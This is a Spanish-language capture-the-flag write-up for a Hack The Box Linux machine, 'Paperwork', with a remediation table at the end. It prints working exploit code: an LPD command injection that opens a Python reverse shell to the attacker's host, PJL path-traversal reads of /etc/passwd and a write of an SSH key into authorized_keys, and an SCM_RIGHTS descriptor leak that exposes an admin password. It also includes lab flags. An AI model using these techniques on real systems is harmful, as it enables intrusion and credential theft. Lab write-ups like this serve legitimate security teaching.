---
title: "HTB Paperwork — LPD Command Injection + PJL Path Traversal + FD Leak"
date: 2026-07-25 10:00:00 -0400
categories: [Writeups, Linux]
tags: [htb, linux, rfc1179, command-injection, path-traversal, scm-rights, oscp]
image:
  path: /assets/img/posts/paperwork.png
  alt: "HTB Paperwork — Linux, Medium"
---

## Resumen

**Paperwork** es una máquina Linux de HTB, dificultad **Medium**, que encadena **tres vulnerabilidades independientes** en servicios internos de "archivado documental": un demonio LPD (RFC 1179) con command injection directa a root, un path traversal en un servicio PJL/JetDirect de impresoras HP, y una fuga de file descriptors root vía `SCM_RIGHTS` sobre un Unix socket.

| Campo | Valor |
|---|---|
| IP | `10.129.1.131` |
| SO | Linux (Ubuntu) |
| Dificultad | Medium |
| Técnicas | LPR/RFC1179 · PJL/JetDirect · SCM_RIGHTS |

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -n -Pn 10.129.1.131

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
```

> Cualquier puerto que nmap no sepa nombrar con confianza (o etiquete raro) merece una verificación manual con `nc` o `curl` antes de seguir.
{: .prompt-tip }

```bash
nmap -sC -sV -p 22,80,1515 10.129.1.131

22/tcp   open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
80/tcp   open  http    nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol
```

La raíz del sitio web es una "Intranet — Document Archiving Service", sin login ni panel de admin: una única página informativa que apunta directo a la superficie de ataque.

```bash
curl -s http://10.129.1.131/ | grep -E "RFC|Queue|Processor"

Protocol            Compliance Level: RFC 1179
Target Queue        archive_intake
Internal Processor  paperwork-archive-v1.02 (descargable)
```

> **RFC 1179** es la especificación del protocolo LPR/LPD (*Line Printer Daemon*), el estándar de impresión remota de Unix de los 90. El puerto 1515 habla ese protocolo, y `archive_intake` es el nombre de cola que espera.
{: .prompt-info }

## Descarga y lectura del código fuente

El propio portal ofrece el "procesador interno" para descarga — cuando un CTF bien diseñado te da el código del servicio vulnerable, lo tenés que leer.

```bash
curl -s http://10.129.1.131/download/archive -o paperwork.zip
unzip -l paperwork.zip

  Length      Date    Time    Name
---------  ---------- -----   ----
     2820  2026-03-12 09:09   server.py
```

El archivo implementa un servidor LPD en Python puro (`socket` + `threading`). Cada conexión entra a `LpdHandler.run()`, que despacha según el primer byte del mensaje:

```python
def run(self):
    data = self.sock.recv(1024)
    command = data[0]

    if command == 2:
        self.handle_print_job(data)   # ← el vector
    elif command in (3, 4):
        self.sock.send(b"Archive_Printer is ready and printing.\n")
```

Dentro de `handle_print_job()`, tras validar la cola `archive_intake`, el servidor parsea el "control file" buscando el campo `J` (job name) del formato LPR estándar — y lo mete, **sin sanitizar**, en un `echo` de shell:

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

> **Vulnerabilidad #1 — Command Injection:** `job_name` viene directo del cliente sin filtro, y se interpola dentro de un string que `subprocess.Popen()` ejecuta con `shell=True`. Quien rompa la comilla simple de `'Archive: {job_name}'` controla el comando — que corre como **root**.
{: .prompt-danger }

## Explotando el protocolo LPR

Para inyectar el payload hay que hablar LPR correctamente: secuencia de bytes de control, tamaño de contenido y ACKs de un byte. El cliente se construye a mano con `socket`.

| Paso | Cliente envía | Servidor responde |
|---|---|---|
| 1 | `\x02archive_intake\n` — comando 2, "receive a printer job" | `\x00` (ACK) |
| 2 | `\x02<size> cfA001localhost\x00` — subcomando "receive control file" | `\x00` (ACK) |
| 3 | Control file: `H<host>\nP<user>\nJ<job>\n` | `\x00` (ACK final) |
| — | El servidor extrae la línea `J` y ejecuta el `echo` vulnerable | |

```python
#!/usr/bin/env python3
import socket

TARGET, PORT = "10.129.1.131", 1515
LHOST, LPORT = "10.10.16.11", 4444

s = socket.socket()
s.connect((TARGET, PORT))

# 1) Comando 2: iniciar trabajo de impresión en la cola válida
s.send(b"\x02archive_intake\n")
assert s.recv(1) == b"\x00"

# 2) Reverse shell en una línea de Python, embebida en el job name
py = ("import socket,subprocess,os;"
      f"s=socket.socket();s.connect(('{LHOST}',{LPORT}));"
      "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
      "subprocess.call(['/bin/sh','-i'])")

# Rompemos la comilla simple del echo original e inyectamos el comando
job_name = f"' ; python3 -c '{py}' ; echo '"

# 3) Control file LPR estándar con el job name malicioso en el campo J
control = f"Hlocalhost\nProot\nJ{job_name}\n".encode()
size = len(control)

s.send(f"\x02{size} cfA001localhost\x00".encode())
assert s.recv(1) == b"\x00"

s.send(control)
s.recv(1)
s.close()
```

> El comando real ejecutado en el servidor termina siendo `echo 'Archive: ' ; python3 -c '...' ; echo '' >> /tmp/archive.log`. La comilla inicial cierra el string vacío de `echo`, el `;` separa sentencias en bash, y la comilla final reabre otra cadena vacía para no romper la sintaxis.
{: .prompt-tip }

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.1.131] 36234
$ id
uid=0(root) gid=0(root) groups=0(root)
```

> El servidor LPD corre como **root** desde el arranque (típico de servicios de impresión que necesitan bindear puertos <1024 o gestionar colas del sistema), así que el RCE es directo a máximos privilegios.
{: .prompt-danger }

## Pivote interno

Con shell interactiva, reviso qué más escucha solo en localhost:

```bash
ss -tunlp

tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*
tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
```

> **Puerto 9100 en localhost** es el puerto estándar de **JetDirect / PJL** (Printer Job Language), el protocolo de gestión de impresoras HP. No es alcanzable desde fuera, así que hay que interactuar desde dentro de esta shell.
{: .prompt-warning }

```bash
nc -vn 127.0.0.1 9100
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535

. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```

El servicio expone su propio código fuente. Se descarga con el comando nativo `FSUPLOAD` del protocolo:

```python
s = socket.socket(); s.connect(("127.0.0.1", 9100))
cmd = f'\x1b%-12345X@PJL FSUPLOAD NAME="0:/jetdirect.py" SIZE=5119\n\x1b%-12345X'.encode()
s.send(cmd)

data = b""
while len(data) < 5119:
    data += s.recv(4096)

open("jetdirect.py", "wb").write(data)
```

## Path Traversal en el sistema de archivos PJL

La lectura de `jetdirect.py` revela cómo el daemon traduce rutas "virtuales" tipo `0:/carpeta/archivo` a rutas reales del filesystem — y el fallo es un clásico de manual:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))

def write(self, path, data):
    target = self._translate(path)
    os.makedirs(os.path.dirname(target), exist_ok=True)  # crea directorios que falten
    with open(target, "wb") as f: f.write(data)
    return "OK"
```

> `os.path.normpath()` colapsa secuencias `../` matemáticamente, pero **nunca comprueba** si el resultado sigue dentro de `self._root`. Con suficientes `../` para llegar a la raíz del filesystem y bajar por la ruta deseada, el "sandbox" desaparece. Encima `write()` crea directorios faltantes con `exist_ok=True`.
{: .prompt-danger }

> Cuando veas `normpath` o `path.join(root, user_input)` sin una comprobación posterior tipo `Path(target).resolve().is_relative_to(root)`, asumí traversal hasta que se demuestre lo contrario.
{: .prompt-tip }

Confirmando lectura arbitraria:

```python
def read_file(path):
    s = socket.socket(); s.connect(("127.0.0.1", 9100))
    pjl_path = f'0:/../../../../../../../../{path.lstrip("/")}'
    s.send(f'\x1b%-12345X@PJL FSUPLOAD NAME="{pjl_path}" SIZE=100000\n\x1b%-12345X'.encode())
    # ... parsear header SIZE= y leer el contenido
```

```bash
python3 read_pjl.py /etc/passwd

Server Header: @PJL FSUPLOAD NAME="0:/../../../../../../../../etc/passwd" SIZE=1672
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

Con lectura y escritura confirmadas fuera del sandbox, se inyecta una clave SSH propia en `authorized_keys` del usuario `archivist` — acceso estable sin depender del RCE del LPD (que deja rastro en `/tmp/archive.log`).

```bash
ssh-keygen -f archivist_key -N ""
python3 write_pjl.py /home/archivist/.ssh/authorized_keys archivist_key.pub
# OK

ssh -i archivist_key archivist@10.129.1.131
archivist@paperwork:~$
```

**User flag:** `0c20f7722f1f7c0765e195e737406f0e`

## Fuga de file descriptors → root

Como `archivist`, aparece un tercer servicio: `paperwork-daemon`, corriendo como root, escuchando en un **Unix socket** (`/run/paperwork/mgmt.sock`).

```bash
ps aux | grep root

root  1487  0.0  0.4  28432 17900 ?  Ss  12:48  0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

Su lógica de "seguridad" monitorea un log de actividad PJL y, al detectar comandos `FSQUERY`/`FSUPLOAD`/`FSDOWNLOAD` (justo los usados en el paso anterior), dispara un "lockdown" que envía evidencia forense a quien esté conectado al socket:

1. **Detección:** el daemon abre `/etc/paperwork/admin_pins.conf` al arrancar (como root) y guarda ese file descriptor en memoria.
2. **Trigger:** si aparece la actividad vigilada en el log, arma `array.array("i", [log_fd, admin_fd])`.
3. **Envío por SCM_RIGHTS:** usa `conn.sendmsg([msg], [(SOL_SOCKET, SCM_RIGHTS, evidence_bundle)])` para pasar esos FDs al proceso conectado al socket.

> `SCM_RIGHTS` es un mecanismo legítimo de IPC en Linux para "regalar" descriptores de archivo abiertos a otro proceso — el receptor obtiene acceso al archivo con los permisos con los que **el emisor** lo abrió, sin importar sus propios permisos. El daemon confía ciegamente en quien está al otro lado del socket.
{: .prompt-info }

```python
def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])  # ← admin_fd filtrado aquí
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

> **Vulnerabilidad #3:** `admin_fd` apunta a `/etc/paperwork/admin_pins.conf`, abierto por el proceso root al iniciar. Al recibirlo por `SCM_RIGHTS`, `archivist` puede leer su contenido directamente desde el descriptor — sin que el kernel vuelva a comprobar permisos del filesystem, porque el FD ya está abierto.
{: .prompt-danger }

Disparando la fuga: generar la actividad vigilada y conectarse al socket a esperar el mensaje con los descriptores adjuntos.

```bash
echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log
```

```python
import socket, struct, os

def recv_fds(sock, msglen, maxfds=2):
    fds = []
    msg, ancdata, _, _ = sock.recvmsg(msglen, socket.MSG_WAITALL)
    for level, typ, data in ancdata:
        if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
            n = len(data) // struct.calcsize("i")
            fds.extend(struct.unpack("i" * n, data[:n*4]))
    return msg, fds

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/paperwork/mgmt.sock")

msg, fds = recv_fds(sock, 1024)
print(f"[+] Mensaje: {msg.decode(errors='ignore')}")
print(f"[+] FDs recibidos: {fds}")

for fd in fds:
    os.lseek(fd, 0, os.SEEK_SET)
    print(os.read(fd, 4096).decode(errors='ignore'))
    os.close(fd)
```

```
archivist$ python3 exploit_fd_leak.py
[+] Mensaje: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[+] FDs recibidos: [3, 4]
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

**Credenciales obtenidas:** `admin : ApparelMortuaryCedar22`

La contraseña filtrada del "admin" resulta ser también la de `root` — reutilización de credenciales que cierra la cadena:

```bash
archivist$ su root
Password: ApparelMortuaryCedar22

root@paperwork:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:** `5ee6425f807c71a8351c3d54751c157f`

## Remediación

| Vulnerabilidad | Severidad | Mitigación |
|---|---|---|
| Command Injection en el LPD (`job_name` sin sanitizar en `Popen(shell=True)`) | Crítica | Eliminar `shell=True`; pasar argumentos como lista, o escribir el log con `open().write()` nativo |
| Path Traversal en PJL (`normpath()` sin validar contra el root) | Crítica | Usar `Path(target).resolve().is_relative_to(Path(root).resolve())` y rechazar si es `False` |
| SCM_RIGHTS sin autenticación de origen | Crítica | Validar `SO_PEERCRED` (uid/gid del proceso conectado) antes de enviar ancillary data |
| Reutilización de credenciales (admin = root) | Media | Credenciales únicas por rol/servicio; rotación tras cualquier exposición |

**Herramientas:** `nmap` · `curl` · `python3 (socket)` · `ssh-keygen` · `nc` · `ss`
